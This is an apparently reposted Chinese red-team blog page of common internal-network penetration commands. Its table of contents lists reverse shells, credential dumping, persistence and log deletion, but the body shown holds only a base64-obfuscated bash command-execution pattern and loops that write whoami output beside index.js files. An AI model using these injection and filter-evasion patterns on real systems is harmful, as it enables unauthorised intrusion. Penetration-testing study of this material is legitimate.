<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="en">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>内网渗透常用命令 - 东隅 Blog</title><meta name="author" content="东隅">
<meta name="author-link" content="">
<meta name="description" content="" /><meta name="keywords" content='攻防, 内网渗透' />
  <meta itemprop="name" content="内网渗透常用命令">
  <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
  <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
  <meta itemprop="wordCount" content="4547">
  <meta itemprop="keywords" content="攻防,内网渗透"><meta property="og:url" content="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/62/">
  <meta property="og:site_name" content="东隅 Blog">
  <meta property="og:title" content="内网渗透常用命令">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-08-15T09:31:01+08:00">
    <meta property="article:modified_time" content="2024-08-15T09:31:01+08:00">
    <meta property="article:tag" content="攻防">
    <meta property="article:tag" content="内网渗透">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="内网渗透常用命令">
<meta name="application-name" content="FixIt">
<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/62/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/63/" /><link rel="next" href="https://dongyu29.github.io/posts/owasp/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/109/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "内网渗透常用命令",
    "inLanguage": "en",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/62\/"
    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 内网渗透","wordcount":  4547 ,
    "url": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/62\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
      "@type": "Organization",
      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
        "@type": "Person",
        "name": "东隅"
      },"description": ""
  }
  </script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a
                class="menu-link"
                href="/posts/"
                
                
              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/categories/"
                
                
              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/tags/"
                
                
              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/posts/"
                  
                  
                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/tags/"
                  
                  
                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                ></a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">内网渗透常用命令</li>
    </ol>
  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>内网渗透常用命令</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="4547 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 4600 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>22 minutes</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Contents</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#命令执行定位资源文件写文件回显httpsbookshentoushitopmanualredteam_commandhtml命令执行定位资源文件写文件回显"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AE%9A%E4%BD%8D%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%86%99%E6%96%87%E4%BB%B6%E5%9B%9E%E6%98%BE">命令执行，定位资源文件写文件回显</a></a></li>
    <li><a href="#写shellhttpsbookshentoushitopmanualredteam_commandhtml写shell"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%E5%86%99shell">写shell</a></a></li>
    <li><a href="#nmaphttpsbookshentoushitopmanualredteam_commandhtmlnmap"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#nmap">nmap</a></a></li>
    <li><a href="#masscanhttpsbookshentoushitopmanualredteam_commandhtmlmasscan"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#masscan">masscan</a></a></li>
    <li><a href="#端口列表httpsbookshentoushitopmanualredteam_commandhtml端口列表"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%E7%AB%AF%E5%8F%A3%E5%88%97%E8%A1%A8">端口列表</a></a></li>
    <li><a href="#字典httpsbookshentoushitopmanualredteam_commandhtml字典"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%E5%AD%97%E5%85%B8">字典</a></a></li>
    <li><a href="#mimikatzhttpsbookshentoushitopmanualredteam_commandhtmlmimikatz"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#mimikatz">Mimikatz</a></a>
      <ul>
        <li><a href="#bypass-lsa-protectionpplhttpsbookshentoushitopmanualredteam_commandhtmlbypass-lsa-protectionppl"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#bypass-lsa-protectionppl">bypass lsa Protection(ppl)</a></a></li>
      </ul>
    </li>
    <li><a href="#cs凭证解析httpsbookshentoushitopmanualredteam_commandhtmlcs凭证解析"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#cs%E5%87%AD%E8%AF%81%E8%A7%A3%E6%9E%90">cs凭证解析</a></a></li>
    <li><a href="#存活主机httpsbookshentoushitopmanualredteam_commandhtml存活主机"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA">存活主机</a></a></li>
    <li><a href="#bypasshttpsbookshentoushitopmanualredteam_commandhtmlbypass"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#bypass">bypass</a></a></li>
    <li><a href="#gobusterhttpsbookshentoushitopmanualredteam_commandhtmlgobuster"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#gobuster">gobuster</a></a></li>
    <li><a href="#dirsearchhttpsbookshentoushitopmanualredteam_commandhtmldirsearch"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#dirsearch">dirsearch</a></a></li>
    <li><a href="#nbtscanhttpsbookshentoushitopmanualredteam_commandhtmlnbtscan"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#nbtscan">nbtscan</a></a></li>
    <li><a href="#代理工具httpsbookshentoushitopmanualredteam_commandhtml代理工具"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7">代理工具</a></a></li>
    <li><a href="#内网穿透工具httpsbookshentoushitopmanualredteam_commandhtml内网穿透工具"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7">内网穿透工具</a></a>
      <ul>
        <li><a href="#fusohttpsbookshentoushitopmanualredteam_commandhtmlfuso"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#fuso">fuso</a></a></li>
        <li><a href="#frphttpsbookshentoushitopmanualredteam_commandhtmlfrp"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#frp">frp</a></a></li>
        <li><a href="#npshttpsbookshentoushitopmanualredteam_commandhtmlnps"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#nps">nps</a></a></li>
        <li><a href="#ioxhttpsbookshentoushitopmanualredteam_commandhtmliox"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#iox">iox</a></a></li>
        <li><a href="#stowawayhttpsbookshentoushitopmanualredteam_commandhtmlstowaway"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#stowaway">Stowaway</a></a></li>
        <li><a href="#venomhttpsbookshentoushitopmanualredteam_commandhtmlvenom"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#venom">Venom</a></a></li>
      </ul>
    </li>
    <li><a href="#sshhttpsbookshentoushitopmanualredteam_commandhtmlssh"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#ssh">ssh</a></a></li>
    <li><a href="#grephttpsbookshentoushitopmanualredteam_commandhtmlgrep"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#grep">grep</a></a></li>
    <li><a href="#mysqlhttpsbookshentoushitopmanualredteam_commandhtmlmysql"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#mysql">mysql</a></a></li>
    <li><a href="#sqlmaphttpsbookshentoushitopmanualredteam_commandhtmlsqlmap"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#sqlmap">sqlmap</a></a></li>
    <li><a href="#找可写目录httpsbookshentoushitopmanualredteam_commandhtml找可写目录"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%E6%89%BE%E5%8F%AF%E5%86%99%E7%9B%AE%E5%BD%95">找可写目录</a></a></li>
    <li><a href="#hydrahttpsbookshentoushitopmanualredteam_commandhtmlhydra"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#hydra">hydra</a></a></li>
    <li><a href="#medusahttpsbookshentoushitopmanualredteam_commandhtmlmedusa"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#medusa">medusa</a></a></li>
    <li><a href="#python交互shellhttpsbookshentoushitopmanualredteam_commandhtmlpython交互shell"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#python%E4%BA%A4%E4%BA%92shell">python交互shell</a></a></li>
    <li><a href="#无交互添加用户httpsbookshentoushitopmanualredteam_commandhtml无交互添加用户"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%E6%97%A0%E4%BA%A4%E4%BA%92%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7">无交互添加用户</a></a>
      <ul>
        <li><a href="#windowshttpsbookshentoushitopmanualredteam_commandhtmlwindows"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#windows">windows</a></a></li>
      </ul>
    </li>
    <li><a href="#防火墙httpsbookshentoushitopmanualredteam_commandhtml防火墙"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%E9%98%B2%E7%81%AB%E5%A2%99">防火墙</a></a></li>
    <li><a href="#frp常用配置httpsbookshentoushitopmanualredteam_commandhtmlfrp常用配置"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#frp%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE">frp常用配置</a></a></li>
    <li><a href="#zerologonhttpsbookshentoushitopmanualredteam_commandhtmlzerologon"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#zerologon">ZeroLogon</a></a></li>
    <li><a href="#删rdp日志httpsbookshentoushitopmanualredteam_commandhtml删rdp日志"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%E5%88%A0rdp%E6%97%A5%E5%BF%97">删rdp日志</a></a></li>
    <li><a href="#开3389httpsbookshentoushitopmanualredteam_commandhtml开3389"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%E5%BC%803389">开3389</a></a></li>
    <li><a href="#文件搜索httpsbookshentoushitopmanualredteam_commandhtml文件搜索"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%E6%96%87%E4%BB%B6%E6%90%9C%E7%B4%A2">文件搜索</a></a>
      <ul>
        <li><a href="#外带oobhttpsbookshentoushitopmanualredteam_commandhtml外带oob"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%E5%A4%96%E5%B8%A6oob">外带oob</a></a></li>
      </ul>
    </li>
    <li><a href="#powershell文件下载httpsbookshentoushitopmanualredteam_commandhtmlpowershell文件下载"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#powershell%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD">powershell文件下载</a></a></li>
    <li><a href="#certutilexe下载httpsbookshentoushitopmanualredteam_commandhtmlcertutilexe下载"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#certutilexe%E4%B8%8B%E8%BD%BD">certutil.exe下载</a></a></li>
    <li><a href="#bitsadminhttpsbookshentoushitopmanualredteam_commandhtmlbitsadmin"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#bitsadmin">bitsadmin</a></a></li>
    <li><a href="#windows权限维持httpsbookshentoushitopmanualredteam_commandhtmlwindows权限维持"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81">windows权限维持</a></a>
      <ul>
        <li><a href="#startup目录httpsbookshentoushitopmanualredteam_commandhtmlstartup目录"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#startup%E7%9B%AE%E5%BD%95">Startup目录</a></a></li>
        <li><a href="#注册键httpsbookshentoushitopmanualredteam_commandhtml注册键"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%E6%B3%A8%E5%86%8C%E9%94%AE">注册键</a></a></li>
        <li><a href="#服务httpsbookshentoushitopmanualredteam_commandhtml服务"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%E6%9C%8D%E5%8A%A1">服务</a></a></li>
        <li><a href="#计划任务httpsbookshentoushitopmanualredteam_commandhtml计划任务"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1">计划任务</a></a></li>
        <li><a href="#wmi事件httpsbookshentoushitopmanualredteam_commandhtmlwmi事件"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#wmi%E4%BA%8B%E4%BB%B6">WMI事件</a></a></li>
        <li><a href="#屏幕保护httpsbookshentoushitopmanualredteam_commandhtml屏幕保护"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%E5%B1%8F%E5%B9%95%E4%BF%9D%E6%8A%A4">屏幕保护</a></a></li>
        <li><a href="#bitsadminhttpsbookshentoushitopmanualredteam_commandhtmlbitsadmin-1"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#bitsadmin-1">bitsadmin</a></a></li>
        <li><a href="#netsh白加黑httpsbookshentoushitopmanualredteam_commandhtmlnetsh白加黑"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#netsh%E7%99%BD%E5%8A%A0%E9%BB%91">Netsh白加黑</a></a></li>
        <li><a href="#msdtchttpsbookshentoushitopmanualredteam_commandhtmlmsdtc"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#msdtc">MSDTC</a></a></li>
      </ul>
    </li>
    <li><a href="#windows信息收集常用命令httpsbookshentoushitopmanualredteam_commandhtmlwindows信息收集常用命令"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4">windows信息收集常用命令</a></a></li>
    <li><a href="#atschtaskssc横向httpsbookshentoushitopmanualredteam_commandhtmlatschtaskssc横向"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#atschtaskssc%E6%A8%AA%E5%90%91">at&amp;schtasks&amp;sc横向</a></a></li>
    <li><a href="#impacket包横向命令httpsbookshentoushitopmanualredteam_commandhtmlimpacket包横向命令"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#impacket%E5%8C%85%E6%A8%AA%E5%90%91%E5%91%BD%E4%BB%A4">impacket包横向命令</a></a></li>
    <li><a href="#反弹shellhttpsbookshentoushitopmanualredteam_commandhtml反弹shell"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%E5%8F%8D%E5%BC%B9shell">反弹shell</a></a></li>
    <li><a href="#nchttpsbookshentoushitopmanualredteam_commandhtmlnc"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#nc">nc</a></a></li>
    <li><a href="#bashhttpsbookshentoushitopmanualredteam_commandhtmlbash"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#bash">bash</a></a></li>
    <li><a href="#perlhttpsbookshentoushitopmanualredteam_commandhtmlperl"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#perl">perl</a></a></li>
    <li><a href="#pythonhttpsbookshentoushitopmanualredteam_commandhtmlpython"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#python">python</a></a></li>
    <li><a href="#phphttpsbookshentoushitopmanualredteam_commandhtmlphp"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#php">php</a></a></li>
    <li><a href="#rubyhttpsbookshentoushitopmanualredteam_commandhtmlruby"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#ruby">ruby</a></a></li>
    <li><a href="#nchttpsbookshentoushitopmanualredteam_commandhtmlnc-1"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#nc-1">nc</a></a></li>
    <li><a href="#javahttpsbookshentoushitopmanualredteam_commandhtmljava"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#java">java</a></a></li>
    <li><a href="#luahttpsbookshentoushitopmanualredteam_commandhtmllua"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#lua">lua</a></a></li>
    <li><a href="#powershellhttpsbookshentoushitopmanualredteam_commandhtmlpowershell"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#powershell">powershell</a></a></li>
    <li><a href="#加密shellhttpsbookshentoushitopmanualredteam_commandhtml加密shell"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%E5%8A%A0%E5%AF%86shell">加密shell</a></a></li>
  </ul>

  <ul>
    <li><a href="#安装httpsbookshentoushitopmanualredteam_commandhtml安装"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%E5%AE%89%E8%A3%85">安装</a></a></li>
    <li><a href="#meterpreter基本命令httpsbookshentoushitopmanualredteam_commandhtmlmeterpreter基本命令"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#meterpreter%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4">Meterpreter基本命令</a></a>
      <ul>
        <li><a href="#基本系统命令httpsbookshentoushitopmanualredteam_commandhtml基本系统命令"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%E5%9F%BA%E6%9C%AC%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4">基本系统命令</a></a></li>
        <li><a href="#文件系统命令httpsbookshentoushitopmanualredteam_commandhtml文件系统命令"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4">文件系统命令</a></a></li>
        <li><a href="#网络命令httpsbookshentoushitopmanualredteam_commandhtml网络命令"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4">网络命令</a></a></li>
        <li><a href="#信息收集httpsbookshentoushitopmanualredteam_commandhtml信息收集"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a></a></li>
        <li><a href="#提权httpsbookshentoushitopmanualredteam_commandhtml提权"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%E6%8F%90%E6%9D%83">提权</a></a></li>
        <li><a href="#获取凭证httpsbookshentoushitopmanualredteam_commandhtml获取凭证"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81">获取凭证</a></a></li>
        <li><a href="#假冒令牌httpsbookshentoushitopmanualredteam_commandhtml假冒令牌"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%E5%81%87%E5%86%92%E4%BB%A4%E7%89%8C">假冒令牌</a></a></li>
        <li><a href="#植入后门httpsbookshentoushitopmanualredteam_commandhtml植入后门"><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8">植入后门</a></a></li>
      </ul>
    </li>
  </ul>
</nav></div>
      </div><div class="content" id="content" data-end-flag="-----（完）-----"><p>手动编码操作</p>
<pre tabindex="0"><code>bash -c {echo,cGluZyAxMjcuMC4wLjE7ZWNobyAxID50ZXN0LnR4dA==}|{base64,-d}|{bash,-i}</code></pre><h2 id="命令执行定位资源文件写文件回显httpsbookshentoushitopmanualredteam_commandhtml命令执行定位资源文件写文件回显" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e5%ae%9a%e4%bd%8d%e8%b5%84%e6%ba%90%e6%96%87%e4%bb%b6%e5%86%99%e6%96%87%e4%bb%b6%e5%9b%9e%e6%98%be"target="_blank" rel="external nofollow noopener noreferrer">命令执行，定位资源文件写文件回显</a></span>
  <a href="#%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e5%ae%9a%e4%bd%8d%e8%b5%84%e6%ba%90%e6%96%87%e4%bb%b6%e5%86%99%e6%96%87%e4%bb%b6%e5%9b%9e%e6%98%behttpsbookshentoushitopmanualredteam_commandhtml%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e5%ae%9a%e4%bd%8d%e8%b5%84%e6%ba%90%e6%96%87%e4%bb%b6%e5%86%99%e6%96%87%e4%bb%b6%e5%9b%9e%e6%98%be" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Linux</p>
<pre tabindex="0"><code>find /|grep index.js|while read f;do sh -c &#34;whoami&#34; &gt;$(dirname $f)/test.txt;done</code></pre><p>Windows(注意盘符)</p>
<pre tabindex="0"><code>for /r D:\ %i in (index.js*) do whoami &gt; %i/../test.txt</code></pre><h2 id="写shellhttpsbookshentoushitopmanualredteam_commandhtml写shell" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%e5%86%99shell"target="_blank" rel="external nofollow noopener noreferrer">写shell</a></span>
  <a href="#%e5%86%99shellhttpsbookshentoushitopmanualredteam_commandhtml%e5%86%99shell" class="heading-mark">
